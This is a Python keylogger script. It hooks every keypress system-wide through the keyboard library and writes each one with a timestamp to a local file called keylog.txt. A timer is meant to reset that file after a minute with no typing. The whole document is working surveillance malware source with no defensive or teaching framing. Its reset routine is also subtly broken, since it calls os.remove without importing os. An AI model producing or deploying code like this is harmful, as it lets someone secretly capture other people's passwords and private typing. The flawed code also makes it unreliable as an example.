import keyboard # for keylogs
import logging # for saving logs
import time # for getting current time
from threading import Timer # for creating a timer

# Create a formatter for the log messages
formatter = logging.Formatter('%(asctime)s - %(message)s')

# Create a function to setup a logger with a given name and file
def setup_logger(name, file):
    # Create a logger with the given name
    logger = logging.getLogger(name)
    # Set the logger level to INFO
    logger.setLevel(logging.INFO)
    # Create a file handler for the given file
    handler = logging.FileHandler(file)
    # Set the handler formatter to the formatter
    handler.setFormatter(formatter)
    # Add the handler to the logger
    logger.addHandler(handler)
    # Return the logger
    return logger

# Setup a logger for the keylogger
keylogger = setup_logger('keylogger', 'keylog.txt')

# Define a global variable to store the last time a key was pressed
last_key_time = time.time()

# Define a global variable to store the threshold for resetting the log file (in seconds)
reset_threshold = 60

# Define a function to reset the log file if no key was pressed for a period of time
def reset_log():
    global last_key_time
    global reset_threshold
    # Get the current time
    current_time = time.time()
    # Calculate the elapsed time since the last key press
    elapsed_time = current_time - last_key_time
    # Check if the elapsed time exceeds the threshold
    if elapsed_time > reset_threshold:
        # Reset the log file by removing it and creating a new one
        try:
            os.remove('keylog.txt')
            setup_logger('keylogger', 'keylog.txt')
        except EnvironmentError:
            pass
    # Create a new timer to repeat this function after every second
    timer = Timer(1, reset_log)
    timer.start()

# Define a callback function for the keyboard events
def on_press(key):
    global last_key_time
    # Update the last key time to the current time
    last_key_time = time.time()
    # Convert the key object to a string and log it
    keylogger.info(str(key))

# Start listening to the keyboard events
keyboard.on_press(on_press)

# Start the timer to check for resetting the log file
reset_log()

keyboard.wait()
